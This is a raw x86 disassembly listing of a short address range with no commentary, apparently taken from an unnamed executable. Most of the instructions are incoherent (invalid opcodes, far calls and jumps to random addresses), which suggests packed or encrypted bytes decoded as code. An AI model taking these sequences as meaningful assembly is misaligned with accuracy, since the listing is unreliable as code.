  40c82e:	or     al,0xb6
  40c830:	jbe    0x40c8ac
  40c832:	sub    al,0x84
  40c834:	adc    al,0xd2
  40c836:	push   ebx
  40c837:	mov    ecx,0xac254f8f
  40c83c:	sub    eax,esi
  40c83e:	pusha  
  40c83f:	mov    ch,0x8a
  40c841:	call   esp
  40c843:	mov    ebp,0xeb9909c1
  40c848:	cwde   
  40c849:	(bad)  
  40c84a:	cmp    al,0x8
  40c84c:	sbb    al,0xf0
  40c84e:	mov    edx,0x3bc19f5
  40c853:	jp     0x40c8a0
  40c855:	je     0x40c881
  40c857:	fisub  WORD PTR [eax]
  40c859:	bnd ret 0x92fb
  40c85d:	sbb    dl,ah
  40c85f:	pop    ecx
  40c860:	jnp    0x40c858
  40c862:	xchg   DWORD PTR [ebp-0x4cf982b5],ecx
  40c868:	cli    
  40c869:	xor    al,0x82
  40c86b:	mov    ah,0x20
  40c86d:	jecxz  0x40c845
  40c86f:	icebp  
  40c870:	dec    esi
  40c871:	add    eax,0x98824fb0
  40c876:	adc    BYTE PTR [ebp+0x276dcc34],0x6a
  40c87d:	shr    DWORD PTR [esi-0x10c3d7bd],cl
  40c883:	pop    ecx
  40c884:	sti    
  40c885:	jge    0x40c8a1
  40c887:	push   es
  40c888:	or     esi,DWORD PTR [edi-0x1a]
  40c88b:	sti    
  40c88c:	mov    eax,DWORD PTR es:[ebp+0xc]
  40c890:	add    eax,DWORD PTR [ebp+0x8]
  40c893:	mov    DWORD PTR [ebp-0x10],eax
  40c896:	mov    eax,DWORD PTR [ebp-0x1c]
  40c899:	test   eax,eax
  40c89b:	je     0x40d717
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0xb6580a43
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c919
  40c8c7:	scas   eax,DWORD PTR es:[edi]
  40c8c8:	lock jle 0x40c892
  40c8cb:	retf   0xb8b9
  40c8ce:	ja     0x40c8a9
  40c8d0:	pop    es
  40c8d1:	int3   
  40c8d2:	les    ebx,FWORD PTR [edx]
  40c8d4:	push   ss
  40c8d5:	inc    esp
  40c8d6:	add    dh,bl
  40c8d8:	cmp    DWORD PTR [edi],ebp
  40c8da:	xlat   BYTE PTR ds:[ebx]
  40c8db:	push   ds
  40c8dc:	mov    bh,0x6b
  40c8de:	or     DWORD PTR [edi-0x79f0c695],eax
  40c8e4:	pop    esp
  40c8e5:	push   esi
  40c8e6:	jecxz  0x40c91f
  40c8e8:	iret   
  40c8e9:	mov    cl,BYTE PTR [ebp-0x7fe5b7b6]
  40c8ef:	mov    ch,0x76
  40c8f1:	jmp    0x2428:0x2c817bd4
  40c8f8:	cmp    ecx,DWORD PTR [ebp+0x20]
  40c8fb:	cmp    DWORD PTR [bp+di],esi
  40c8fe:	out    dx,al
  40c8ff:	clc    
  40c900:	je     0x40c8cb
  40c902:	aas    
  40c903:	leave  
  40c904:	inc    ebx
  40c905:	pop    ecx
  40c906:	(bad)  
  40c907:	lea    eax,[edx+0x68]
  40c90a:	push   DWORD PTR [edi]
  40c90c:	sbb    eax,DWORD PTR [edi]
  40c90e:	cmp    eax,0x54dab7c2
  40c913:	fcomp  DWORD PTR [edi-0x42]
  40c916:	sbb    eax,0xf889cdb1
  40c91b:	fcomp  st(2)
  40c91d:	mov    al,ah
  40c91f:	femms  
  40c921:	push   0x521358e6
  40c926:	inc    edx
  40c927:	adc    DWORD PTR [edx+0x16],ecx
  40c92a:	xor    al,BYTE PTR [edx-0x4c]
  40c92d:	or     al,0x8e
  40c92f:	xor    dh,BYTE PTR [ebx-0x4686dc54]
  40c935:	stos   BYTE PTR es:[edi],al
  40c936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c937:	mov    ebx,0xa5aee91
  40c93c:	push   0xf6f7cead
  40c941:	jmp    0x40c98f
  40c943:	mov    ss,eax
  40c945:	mov    al,bh
  40c947:	or     ebx,ebx
  40c949:	push   0x44192f6f
  40c94e:	sbb    ch,BYTE PTR [ebx+0x5a960bfb]
  40c954:	jmp    0x4dcc:0x6a1a04dc
  40c95b:	mov    esi,0x7ee25aaa
  40c960:	data16 arpl WORD PTR [eax],bp
  40c963:	xor    DWORD PTR [eax+esi*8-0x38679895],ebx
  40c96a:	es sub edi,0x70
  40c96e:	stc    
  40c96f:	mov    ah,0x21
  40c971:	add    BYTE PTR [ecx+0x2a4c3574],ch
  40c977:	pop    esp
  40c978:	push   cs
  40c979:	inc    ecx
  40c97a:	mov    ecx,0xe34a7454
  40c97f:	or     al,0x17
  40c981:	lahf   
  40c982:	enter  0xb79,0x0
  40c986:	stc    
  40c987:	add    eax,0xb3ee4579
  40c98c:	mov    edi,0xe7fefbb1
  40c991:	dec    ecx
  40c992:	add    eax,0xf018955f
  40c997:	pop    es
  40c998:	sbb    DWORD PTR [edi+0x6d25ba51],0x8f2cd512
  40c9a2:	pop    edx
  40c9a3:	fstp   DWORD PTR [edx]
  40c9a5:	and    ecx,DWORD PTR [esi+0x42]
  40c9a8:	sbb    DWORD PTR [edx-0x3e],ebx
  40c9ab:	push   esp
  40c9ac:	xchg   esi,eax
  40c9ad:	fdiv   QWORD PTR [edi]
  40c9af:	pushf  
  40c9b0:	(bad)  
  40c9b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9b2:	aas    
  40c9b3:	adc    eax,0x3780f1b3
  40c9b8:	adc    DWORD PTR [edx-0x2],0xa3829e80
  40c9bf:	mov    WORD PTR [ebp+0x4b],fs
  40c9c2:	push   esi
  40c9c3:	(bad)  
  40c9c4:	fstp   DWORD PTR [edi+ebx*2+0x95eca16]
  40c9cb:	je     0x40ca49
  40c9cd:	ficomp WORD PTR [edx-0x5883ef57]
  40c9d3:	and    BYTE PTR [ecx],ah
  40c9d5:	popf   
  40c9d6:	test   al,0xfc
  40c9d8:	aas    
  40c9d9:	xor    DWORD PTR [edi+ebx*8],eax
  40c9dc:	or     al,0x57
  40c9de:	jnp    0x40c98e
  40c9e0:	mov    ah,0x38
  40c9e2:	idiv   BYTE PTR [ecx+eax*1]
  40c9e5:	test   eax,0x32463e66
  40c9ea:	adc    eax,0x291ea50c
  40c9ef:	nop
  40c9f0:	cmp    BYTE PTR ds:0x8563b55e,dh
  40c9f6:	data16 (bad) 
  40c9f8:	lods   eax,DWORD PTR ds:[esi]
  40c9f9:	pop    edx
  40c9fa:	lods   eax,DWORD PTR ds:[esi]
  40c9fb:	inc    ebp
  40c9fc:	enter  0x800,0xb3
  40ca00:	cmp    BYTE PTR [esi],0x3
  40ca03:	pop    ds
  40ca04:	dec    esi
  40ca05:	mov    ebp,0x59e949b5
  40ca0a:	add    DWORD PTR [eax],eax
  40ca0c:	add    BYTE PTR [ecx],ah
  40ca0e:	xchg   esp,eax
  40ca0f:	inc    esi
  40ca10:	sbb    ebx,DWORD PTR [ebx-0x3]
  40ca13:	lods   al,BYTE PTR gs:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0x9a3d45cf
  40ca1c:	inc    edi
  40ca1d:	dec    eax
  40ca1e:	hlt    
  40ca1f:	jle    0x40ca9f
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40ca7b
  40ca26:	out    dx,eax
  40ca27:	les    edx,FWORD PTR [edx+0x61]
  40ca2a:	stos   DWORD PTR es:[edi],eax
  40ca2b:	push   edi
  40ca2c:	popa   
  40ca2d:	inc    eax
  40ca2e:	stos   DWORD PTR es:[edi],eax
  40ca2f:	jg     0x40ca23
  40ca31:	mov    esi,0x9f6da7cf
  40ca36:	jno    0x40ca19
  40ca38:	pop    esi
  40ca39:	js     0x40ca69
  40ca3b:	(bad)  [edx+0x12]
  40ca3e:	dec    edi
  40ca3f:	dec    edx
  40ca40:	les    edx,FWORD PTR [edi+0x71a3f82a]
  40ca46:	pop    ecx
  40ca47:	and    DWORD PTR [esi-0x6d07d95c],edi
  40ca4d:	adc    ch,BYTE PTR [edi+eiz*2+0x20]
  40ca51:	cmp    BYTE PTR [eax+ebx*8-0x22d535c6],bl
  40ca58:	add    BYTE PTR [ebx],0xb
  40ca5b:	div    BYTE PTR [ebp-0x15]
  40ca5e:	push   edi
  40ca5f:	pusha  
  40ca60:	pop    eax
  40ca61:	int3   
  40ca62:	jmp    0x40ca84
  40ca64:	or     DWORD PTR [esi],0x81078215
  40ca6a:	stos   BYTE PTR es:[edi],al
  40ca6b:	sub    DWORD PTR [edi+0x42],edi
  40ca6e:	mov    ch,0x36
  40ca70:	jbe    0x40cadf
  40ca72:	adc    al,0xc
  40ca74:	jbe    0x40ca50
  40ca76:	xchg   ecx,eax
  40ca77:	aas    
  40ca78:	mov    eax,0x1251eb1
  40ca7d:	data16 xor BYTE PTR [esi],bh
  40ca80:	ins    DWORD PTR es:[edi],dx
  40ca81:	mov    cl,0xe5
  40ca83:	iret   
  40ca84:	push   es
  40ca85:	hlt    
  40ca86:	pop    edi
  40ca87:	outs   dx,BYTE PTR ds:[esi]
  40ca88:	lds    ebp,FWORD PTR [eax-0x3c]
  40ca8b:	neg    DWORD PTR [edx+0x29]
  40ca8e:	rcr    DWORD PTR [ebx+0x1557a961],1
  40ca94:	sub    BYTE PTR [edx],cl
  40ca96:	cdq    
  40ca97:	mov    ah,0x46
  40ca99:	inc    ebp
  40ca9a:	mov    edi,0x31cf00f
  40ca9f:	fidivr WORD PTR [ecx+0x44174d8f]
  40caa5:	jle    0x40caed
  40caa7:	setnp  al
  40caaa:	add    bh,al
  40caac:	inc    eax
  40caad:	lods   eax,DWORD PTR ds:[esi]
  40caae:	or     BYTE PTR [edi-0x64],0x85
  40cab2:	dec    ecx
  40cab3:	ror    cl,0x44
  40cab6:	jle    0x40cad6
  40cab8:	leave  
  40cab9:	xor    al,0xc5
  40cabb:	je     0x40ca4c
  40cabd:	dec    ebp
  40cabe:	arpl   dx,ax
  40cac0:	lea    edx,[edx+0x1b3ddf18]
  40cac6:	xor    BYTE PTR [ebx],ch
  40cac8:	pop    esp
  40cac9:	cld    
  40caca:	add    BYTE PTR ds:0x46556a9f,bl
  40cad0:	pop    DWORD PTR fs:[ebp+esi*1-0x36]
  40cad5:	push   edi
  40cad6:	outs   dx,BYTE PTR ds:[esi]
  40cad7:	cmp    dl,ch
  40cad9:	inc    ecx
  40cada:	adc    BYTE PTR [ebx],bl
  40cadc:	addr16 hlt 
  40cade:	push   0xffffff8a
  40cae0:	push   0x4fee846a
  40cae5:	popa   
  40cae6:	sbb    BYTE PTR [eax-0x3f],bl
  40cae9:	fucomip st,st(7)
  40caeb:	out    0x84,al
  40caed:	push   edi
  40caee:	xchg   edi,eax
  40caef:	mov    esp,0x241b549d
  40caf4:	mov    edi,0x884daca4
  40caf9:	cmp    eax,0x9873abf8
  40cafe:	pop    es
  40caff:	loop   0x40cb5c
  40cb01:	rcr    BYTE PTR ds:0x5b833275,1
  40cb07:	and    ebp,0x523fa69
  40cb0d:	repz mov ds:0x82bdb6b7,al
  40cb13:	loope  0x40cb71
  40cb15:	iret   
  40cb16:	aam    0xce
  40cb18:	add    ebp,DWORD PTR [ebx+0x10]
  40cb1b:	and    al,0x2a
  40cb1d:	test   DWORD PTR [edi+ecx*4+0x5f],esp
  40cb21:	or     dx,sp
  40cb24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb25:	mov    BYTE PTR [ecx-0x230e894b],bh
  40cb2b:	dec    ebp
  40cb2c:	pop    esi
  40cb2d:	and    dl,al
  40cb2f:	(bad)  
  40cb30:	adc    al,0xdf
  40cb32:	cdq    
  40cb33:	xor    eax,0x8bb9ee64
  40cb38:	mov    ebx,DWORD PTR gs:[ebx+0x511ab6e4]
  40cb3f:	add    al,0xbb
  40cb41:	pop    ebx
  40cb42:	mov    DWORD PTR [edi],ecx
  40cb44:	cmp    bh,BYTE PTR [ecx-0x7ee6e520]
  40cb4a:	cmp    BYTE PTR ds:0x236d906a,bh
  40cb50:	stc    
  40cb51:	lods   al,BYTE PTR ds:[esi]
  40cb52:	dec    edi
  40cb53:	xlat   BYTE PTR ds:[ebx]
  40cb54:	loopne 0x40cb9f
  40cb56:	cmp    DWORD PTR [edx-0x4f],edx
  40cb59:	inc    bh
  40cb5b:	xchg   edi,eax
  40cb5c:	fisubr DWORD PTR [esi+0x17]
  40cb5f:	jg     0x40cb6f
  40cb61:	stc    
  40cb62:	and    DWORD PTR [ecx-0x58],edx
  40cb65:	pop    bx
  40cb67:	xchg   ebx,ecx
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cc04
  40cb8b:	lds    eax,FWORD PTR [ebx]
  40cb8d:	sbb    cl,BYTE PTR [ecx]
  40cb8f:	idiv   BYTE PTR [esi+0x7e]
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cb3e
  40cb97:	adc    ah,BYTE PTR [ebp-0x57ee5e72]
  40cb9d:	push   esi
  40cb9e:	xchg   ebp,eax
  40cb9f:	fild   QWORD PTR [edi+0x100dee99]
  40cba5:	dec    edi
  40cba6:	jle    0x40cbea
  40cba8:	in     eax,0x8a
  40cbaa:	aas    
  40cbab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbac:	add    eax,0xda446c3d
  40cbb1:	sbb    bl,BYTE PTR [ecx]
  40cbb3:	pusha  
  40cbb4:	push   0x1d211be1
  40cbb9:	jno    0x40cb68
  40cbbb:	outs   dx,BYTE PTR ds:[esi]
  40cbbc:	or     DWORD PTR [esp+edi*2-0x107e7754],eax
  40cbc3:	les    eax,FWORD PTR [ebp-0x6b432e7c]
  40cbc9:	ret    
  40cbca:	ins    BYTE PTR es:[edi],dx
  40cbcb:	shl    BYTE PTR [edx-0x3c083a73],1
  40cbd1:	mov    BYTE PTR [edi],dh
  40cbd3:	std    
  40cbd4:	inc    esp
  40cbd5:	ds jo  0x40cbb1
  40cbd8:	jmp    0x9f5bea14
  40cbdd:	push   edx
  40cbde:	cmc    
  40cbdf:	cmp    dl,dh
  40cbe1:	(bad)  
  40cbe2:	nop
  40cbe3:	jmp    0x5628aad8
  40cbe8:	retf   
  40cbe9:	jp     0x40cc11
  40cbeb:	arpl   WORD PTR [edx-0x4d60e1ea],dx
  40cbf1:	push   ebp
  40cbf2:	lods   eax,DWORD PTR ds:[esi]
  40cbf3:	cmp    bl,bl
  40cbf5:	stos   DWORD PTR es:[edi],eax
  40cbf6:	xor    ch,BYTE PTR [eax+ebp*4-0x5b]
  40cbfa:	push   ebp
  40cbfb:	cdq    
  40cbfc:	and    DWORD PTR [eax-0x6df8a6e7],ebp
  40cc02:	in     eax,0x7f
  40cc04:	aaa    
  40cc05:	aam    0xff
  40cc07:	inc    ecx
  40cc08:	aad    0xbf
  40cc0a:	and    dh,BYTE PTR [edx-0x3]
  40cc0d:	jg     0x40cc5b
  40cc0f:	xchg   esi,eax
  40cc10:	mov    ds:0x4bb895db,eax
  40cc15:	nop
  40cc16:	lods   eax,DWORD PTR ds:[esi]
  40cc17:	add    eax,0xf931e9c0
  40cc1c:	dec    ebx
  40cc1d:	mov    al,ds:0x3c7d3d76
  40cc22:	mov    eax,ds:0x68a12c78
  40cc27:	retf   
  40cc28:	sbb    al,0x8a
  40cc2a:	or     al,0xe3
  40cc2c:	or     dl,dl
  40cc2e:	stos   DWORD PTR es:[edi],eax
  40cc2f:	data16 jae 0x40cc2f
  40cc32:	push   ds
  40cc33:	push   edi
  40cc34:	sar    edi,cl
  40cc36:	and    eax,ebp
  40cc38:	push   ebx
  40cc39:	pop    ebp
  40cc3a:	neg    DWORD PTR [ebp+0x7c]
  40cc3d:	clc    
  40cc3e:	nop
  40cc3f:	mov    ebx,esp
  40cc41:	sub    bh,BYTE PTR [esi-0x468a9361]
  40cc47:	retf   0xcf3
  40cc4a:	or     bl,cl
  40cc4c:	stos   BYTE PTR es:[edi],al
  40cc4d:	inc    esp
  40cc4e:	mov    eax,0x24943299
  40cc53:	dec    edi
  40cc54:	xchg   dh,ch
  40cc56:	dec    ebp
  40cc57:	mov    BYTE PTR [ebx+esi*4-0x3b],dl
  40cc5b:	mov    eax,ds:0x5521479a
  40cc60:	push   0xffffffc4
  40cc62:	jne    0x40cc51
  40cc64:	mov    al,0x4f
  40cc66:	pushf  
  40cc67:	dec    esp
  40cc68:	in     al,0xf5
  40cc6a:	jle    0x40cc47
  40cc6c:	scas   eax,DWORD PTR es:[edi]
  40cc6d:	mov    ds:0xf885f3e7,al
  40cc72:	jle    0x40cc18
  40cc74:	sub    eax,0xd7d92c1c
  40cc79:	xor    esi,DWORD PTR [edx-0x4c]
  40cc7c:	adc    eax,0x5ca2bf45
  40cc81:	retf   0xd5c
  40cc84:	pop    eax
  40cc85:	jne    0x40cced
  40cc87:	call   0xdd6d:0x678e3375
  40cc8e:	icebp  
  40cc8f:	pushf  
  40cc90:	aas    
  40cc91:	sub    DWORD PTR [eax-0x54],0x5086ab7d
  40cc98:	and    eax,0xec82b6a5
  40cc9d:	fnstcw WORD PTR [ecx-0x3bcaaea9]
  40cca3:	jp     0x40cc50
  40cca5:	mov    ds:0x6242fd3c,al
  40ccaa:	data16 jo 0x40cc58
  40ccad:	mov    ebp,0xcfc5ce4d
  40ccb2:	ret    
  40ccb3:	inc    esp
  40ccb4:	xchg   edx,eax
  40ccb5:	and    bl,BYTE PTR [edx]
  40ccb7:	mov    dh,ch
  40ccb9:	jmp    0x40ccde
  40ccbb:	aad    0x44
  40ccbd:	cmp    DWORD PTR [ecx-0x16],ebp
  40ccc0:	inc    edx
  40ccc1:	xchg   ebp,eax
  40ccc2:	pop    esi
  40ccc3:	mov    dh,0x4a
  40ccc5:	int3   
  40ccc6:	sbb    eax,0x48cbcf4b
  40cccb:	inc    esi
  40cccc:	clc    
  40cccd:	rcl    DWORD PTR [ebx+0x4d],1
  40ccd0:	push   0xb55b6356
  40ccd5:	pop    ebp
  40ccd6:	or     eax,0xb9fc458b
  40ccdb:	push   esi
  40ccdc:	or     BYTE PTR [ecx+0x7],dl
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0x80ec1d3a
  40ccf1:	arpl   WORD PTR [edx],di
  40ccf3:	mov    edi,0x7e7ef7ca
  40ccf8:	aas    
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cce3
  40ccfd:	call   0x78a5c122
  40cd02:	jae    0x40cd01
  40cd04:	cmc    
  40cd05:	jle    0x40cd1e
  40cd07:	and    eax,0x311e318d
  40cd0c:	add    BYTE PTR [edx+ebp*8+0x6c],dh
  40cd10:	dec    esi
  40cd11:	repz fwait
  40cd13:	sbb    bh,cl
  40cd15:	dec    ebp
  40cd16:	inc    edx
  40cd17:	xchg   esp,eax
  40cd18:	or     bh,BYTE PTR [edx+0x3f3dddda]
  40cd1e:	cld    
  40cd1f:	fcmovnb st,st(5)
  40cd21:	cmc    
  40cd22:	les    ebp,FWORD PTR [ebp+0x4abce52b]
  40cd28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd29:	les    ebp,FWORD PTR [eax+0x55c94eca]
  40cd2f:	inc    esi
  40cd30:	pop    ds
  40cd31:	mul    BYTE PTR [ebx+0x29]
  40cd34:	xchg   ebx,eax
  40cd35:	mov    edi,0xfc97a175
  40cd3a:	mov    ds:0x19038938,al
  40cd3f:	std    
  40cd40:	in     al,dx
  40cd41:	and    bl,BYTE PTR [esi-0x4d37f913]
  40cd47:	xor    BYTE PTR [esi-0x12],bl
  40cd4a:	fxch   st(1)
  40cd4c:	jg     0x40cdae
  40cd4e:	push   es
  40cd4f:	out    0xd2,eax
  40cd51:	lock and BYTE PTR [ebx],0xee
  40cd55:	les    ebx,FWORD PTR [ecx]
  40cd57:	xor    BYTE PTR [eax-0x26],ah
  40cd5a:	loopne 0x40cd67
  40cd5c:	jmp    0x7f2efe4c
  40cd61:	nop
  40cd62:	out    0xd6,al
  40cd64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd65:	adc    al,0x80
  40cd67:	shr    esp,0x3f
  40cd6a:	sub    DWORD PTR [edi-0x6b],esi
  40cd6d:	mov    cl,BYTE PTR [eiz*4+0x49800d8f]
  40cd74:	sbb    eax,0x120f9930
  40cd79:	loope  0x40cde2
  40cd7b:	and    DWORD PTR [eax-0x26],ebp
  40cd7e:	add    BYTE PTR [edi+0x3f],dl
  40cd81:	pop    es
  40cd82:	sub    ebp,DWORD PTR [edx-0x5b]
  40cd85:	pop    edi
  40cd86:	out    0x7,eax
  40cd88:	les    ebp,FWORD PTR [ecx]
  40cd8a:	dec    esp
  40cd8b:	adc    al,0x3d
  40cd8d:	daa    
  40cd8e:	shr    DWORD PTR [ecx-0x23],0x19
  40cd92:	nop
  40cd93:	mov    dh,0xe6
  40cd95:	mov    al,0x1f
  40cd97:	dec    esi
  40cd98:	jmp    0x7427a9ee
  40cd9d:	stos   DWORD PTR es:[edi],eax
  40cd9e:	cmp    eax,0xcda52e54
  40cda3:	add    al,0xe3
  40cda5:	mov    cl,0x9f
  40cda7:	stc    
  40cda8:	mov    edx,ds
  40cdaa:	xor    eax,0xd3a93f33
  40cdaf:	sub    eax,0x65588a67
  40cdb4:	xlat   BYTE PTR ds:[ebx]
  40cdb5:	inc    edi
  40cdb6:	sahf   
  40cdb7:	jns    0x40cdb2
  40cdb9:	leave  
  40cdba:	mov    BYTE PTR [ecx-0x78],ch
  40cdbd:	in     al,0x8c
  40cdbf:	jno    0x40cdb6
  40cdc1:	in     eax,dx
  40cdc2:	mov    cl,0x44
  40cdc4:	(bad)  
  40cdc5:	and    cl,BYTE PTR [ebx-0x65]
  40cdc8:	jg     0x40ce3f
  40cdca:	lahf   
  40cdcb:	sub    BYTE PTR [ebp-0xaae1fb7],ah
  40cdd1:	aam    0xc3
  40cdd3:	dec    esp
  40cdd4:	sbb    BYTE PTR [ebx+0x36d4a776],bh
  40cdda:	jae    0x40cdac
  40cddc:	inc    ebx
  40cddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdde:	xchg   ecx,eax
  40cddf:	das    
  40cde0:	loopne 0x40cd8f
  40cde2:	sahf   
  40cde3:	add    ah,dh
  40cde5:	lock fcomp QWORD PTR [edi]
  40cde8:	dec    BYTE PTR [edx-0x2ce858e4]
  40cdee:	mov    cl,0xa3
  40cdf0:	jg     0x40cdd9
  40cdf2:	jae    0x40ce55
  40cdf4:	cmp    ch,al
  40cdf6:	mov    ecx,0x5843b77c
  40cdfb:	adc    BYTE PTR [edi+0x322cfe45],bl
  40ce01:	cmp    ecx,DWORD PTR [eax]
  40ce03:	out    dx,eax
  40ce04:	cmp    DWORD PTR ss:[ebx],edx
  40ce07:	jecxz  0x40ce45
  40ce09:	xchg   BYTE PTR [esp+esi*1-0x26],ah
  40ce0d:	std    
  40ce0e:	imul   esp,DWORD PTR [edx],0xffffffab
  40ce11:	rcl    dh,cl
  40ce13:	jle    0x40cdbe
  40ce15:	pop    eax
  40ce16:	mov    bl,0xfb
  40ce18:	shl    DWORD PTR [eax-0x59e173af],1
  40ce1e:	cmp    eax,DWORD PTR [edx]
  40ce20:	sbb    BYTE PTR [ebx-0x41e7aa25],dh
  40ce26:	xchg   edi,eax
  40ce27:	mov    esp,0xc58d068f
  40ce2c:	inc    edi
  40ce2d:	add    DWORD PTR [ecx],ecx
  40ce2f:	mov    ebp,cs
  40ce31:	imul   esi,esp,0xe2a60508
  40ce37:	enter  0xb430,0xa1
  40ce3b:	into   
  40ce3c:	add    DWORD PTR [ebx],esi
  40ce3e:	sar    DWORD PTR [edx+0x32729d],0x3
  40ce45:	ret    0x59e9
  40ce48:	add    DWORD PTR [eax],eax
  40ce4a:	add    BYTE PTR [edx-0x52a4f329],dh
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0x25745331,eax
  40ce59:	push   edi
  40ce5a:	jae    0x40cde7
  40ce5c:	mov    BYTE PTR [esi+0x7e],bh
  40ce5f:	aas    
  40ce60:	jg     0x40cee0
  40ce62:	jle    0x40cee3
  40ce64:	mov    ebp,0x902861a3
  40ce6a:	adc    ecx,edx
  40ce6c:	xchg   esp,eax
  40ce6d:	daa    
  40ce6e:	push   0xffffffea
  40ce70:	sbb    DWORD PTR [eax+esi*4+0x41ac52ba],edi
  40ce77:	jo     0x40ce07
  40ce79:	test   al,0x3
  40ce7b:	cwde   
  40ce7c:	cmp    BYTE PTR [ebx+0x6db3b787],ah
  40ce82:	sbb    DWORD PTR [edx-0x72],ebx
  40ce85:	or     al,0x3f
  40ce87:	xor    al,0xde
  40ce89:	pop    eax
  40ce8a:	push   edi
  40ce8b:	xchg   dh,bl
  40ce8d:	mov    eax,gs
  40ce8f:	xor    edi,DWORD PTR [eax]
  40ce91:	and    edi,edi
  40ce93:	inc    ebx
  40ce94:	(bad)  
  40ce95:	dec    ecx
  40ce96:	pop    ss
  40ce97:	mov    ebp,0xa2a50b63
  40ce9c:	stc    
  40ce9d:	mov    ch,0xa5
  40ce9f:	lods   eax,DWORD PTR ds:[esi]
  40cea0:	fwait
  40cea1:	mov    dl,0x74
  40cea3:	push   edx
  40cea4:	xchg   ebx,eax
  40cea5:	int3   
  40cea6:	inc    edi
  40cea7:	pop    esi
  40cea8:	cmp    ecx,0x4b
  40ceab:	mov    cl,0x65
  40cead:	adc    bl,bh
  40ceaf:	inc    ebx
  40ceb0:	les    eax,FWORD PTR [esi+0x5c]
  40ceb3:	leave  
  40ceb4:	jns    0x40cf13
  40ceb6:	ror    DWORD PTR [esi+0x4e],1
  40ceb9:	popf   
  40ceba:	aam    0x3
  40cebc:	mul    BYTE PTR [esi]
  40cebe:	mov    cl,0xa7
  40cec0:	push   ebp
  40cec1:	xor    ah,BYTE PTR [ecx+0x7a70cf56]
  40cec7:	mov    DWORD PTR [ebp-0x46],eax
  40ceca:	sbb    eax,0x3523ba94
  40cecf:	mov    dh,0x3e
  40ced1:	repz pushf 
  40ced3:	push   esp
  40ced4:	sub    eax,0xc1af6797
  40ced9:	add    edx,edx
  40cedb:	add    DWORD PTR [ebx],ebx
  40cedd:	fidiv  DWORD PTR [eax]
  40cedf:	add    al,0x46
  40cee1:	int    0x70
  40cee3:	xor    BYTE PTR [edx-0x5e8ade52],bh
  40cee9:	add    al,0x97
  40ceeb:	das    
  40ceec:	push   0xffffffeb
  40ceee:	lods   al,BYTE PTR ds:[esi]
  40ceef:	mov    ds:0xff594182,eax
  40cef4:	push   ecx
  40cef5:	daa    
  40cef6:	xor    esp,DWORD PTR [ebx+eiz*2-0x4]
  40cefa:	icebp  
  40cefb:	pop    esi
  40cefc:	push   ecx
  40cefd:	ins    DWORD PTR es:[edi],dx
  40cefe:	mov    edi,0x366db82e
  40cf03:	lahf   
  40cf04:	call   0x56c65f4c
  40cf09:	mov    ds:0x6fed7568,eax
  40cf0e:	jmp    0xc6d:0x7dd94596
  40cf15:	retf   
  40cf16:	xor    edi,DWORD PTR [eax+ebx*4-0x1ac8f55c]
  40cf1d:	fcmovnu st,st(0)
  40cf1f:	rcl    DWORD PTR ds:0x529a9c3f,1
  40cf25:	cdq    
  40cf26:	push   es
  40cf27:	mov    ah,0x68
  40cf29:	cmp    DWORD PTR [ebx-0x51cd0f09],0x15d8d937
  40cf33:	xor    dh,BYTE PTR [ebx]
  40cf35:	not    BYTE PTR [edx+0x56702165]
  40cf3b:	repz daa 
  40cf3d:	or     esi,DWORD PTR [ecx-0x47]
  40cf40:	mov    cs,WORD PTR [edi+0x73]
  40cf43:	in     eax,dx
  40cf44:	xchg   esp,eax
  40cf45:	loopne 0x40cec8
  40cf47:	xchg   BYTE PTR [ecx],cl
  40cf49:	adc    al,0x6f
  40cf4b:	and    DWORD PTR [ebx+0x25a83b22],edx
  40cf51:	test   al,0xb5
  40cf53:	call   0xe784:0xc43bb68f
  40cf5a:	imul   esi,DWORD PTR [edx+0x3e],0xb4816c02
  40cf61:	(bad)  
  40cf62:	nop
  40cf63:	stos   DWORD PTR es:[edi],eax
  40cf64:	dec    edi
  40cf65:	inc    ebp
  40cf66:	cmp    ebp,edx
  40cf68:	retf   
  40cf69:	lods   eax,DWORD PTR ds:[esi]
  40cf6a:	xchg   BYTE PTR [esi+ebp*4],ah
  40cf6d:	or     bl,bl
  40cf6f:	sqrtps xmm4,XMMWORD PTR [eax-0x6c]
  40cf73:	push   esp
  40cf74:	push   es
  40cf75:	repnz stos BYTE PTR es:[edi],al
  40cf77:	jl     0x40cf8e
  40cf79:	sbb    eax,0xf4cdda22
  40cf7e:	jg     0x40cf12
  40cf80:	or     bh,dl
  40cf82:	adc    al,0xb1
  40cf84:	lods   al,BYTE PTR ds:[esi]
  40cf85:	mov    ds:0xaf4014c5,eax
